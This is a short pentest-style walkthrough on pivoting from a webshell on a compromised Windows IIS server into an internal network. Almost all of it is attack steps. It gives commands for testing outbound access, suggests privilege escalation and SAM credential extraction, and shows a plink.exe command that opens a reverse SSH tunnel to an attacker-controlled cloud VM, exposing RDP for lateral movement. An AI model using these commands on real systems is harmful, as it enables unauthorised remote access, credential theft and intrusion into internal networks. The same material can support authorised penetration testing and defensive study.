Pivoting with SSH Tunnels and Plink on a Windows server (basic example)
======================================================================================================


Step 1. During a penetration test, you managed to hack a vulnerable Internet facing website and you uploaded a webshell on the underlying IIS Web server
        (which is running on a Windows server).


Step 2. Using your webshell and native commands like 'Test-NetConnection' (or tools like 'portqry'), check that the underlying Windows server 
        can browse the Internet without going through a corporate proxy.

        + Examples for the PowerShell command 'Test-NetConnection'
          > powershell -c Test-NetConnection google.com -Port 443
          > powershell -c "test-netconnection www.website.com -CommonTCPPort HTTP"

        + Examples for the Microsoft command line tool 'portqry.exe' or 'portqryv2.exe' (you will need to upload it on the server)
          > portqry.exe -n <public-IP> -e <port>
          > portqry.exe -n www.website.com -e 443


Step 3. If you are lucky your webshell is already running as 'NT AUTHORITY\System', otherwise you need to escalate your privileges to become local admin
        (using for example the juicy potato exploit). Then create a new local admin account or extract & crack local admin creds from the SAM registry
        or live memory...


Step 4. Upload the command line tool 'plink.exe' (included in the Putty installation package) on the compromised Windows server using your webshell


Step 5. Execute a 'plink.exe' command with your webshell to create a SSH tunnel between the compromised Windows server and a remote Internet facing 
        server that you control. You can use a Kali Linux VM hosted on the AWS Public Cloud platform or the Azure Public Cloud platform.

        + Example of command to execute on the compromised Windows server (via your webshell) to create an SSH remote port forward rule for the RDP port 3389.
          > echo y | c:\windows\temp\plink.exe <public-IP-pentester-kali-VM> -l <username> -pw <password> -P 443 -C -R 0.0.0.0:1080:<victim-server-local-IP>:3389 


Step 6. Use RDP over the SSH tunnel (remote port forward rule) to log into the compromised Windows server from Internet with your Kali Linux VM
        and pivot to attack the internal network.
        
        On your Kali Linux VM you can use 'rdesktop' or 'xfreerdp' pointing to localhost and the port 1080 that will redirect your connection through the
        SSH tunnel to the port 3389 of the compromised Windows server.
        
        # sudo apt-get update
        # sudo sudo apt install freerdp2-x11 freerdp2-shadow-x11
        # xfreerdp /f /u:USERNAME /p:PASSWORD /v:localhost:1080 
        
        OR
        
        # sudo apt-get update
        # sudo apt install rdesktop
        # rdesktop -u <local-admin-username> -p 'PASSWORD' localhost:1080 -g 1024Ã—768
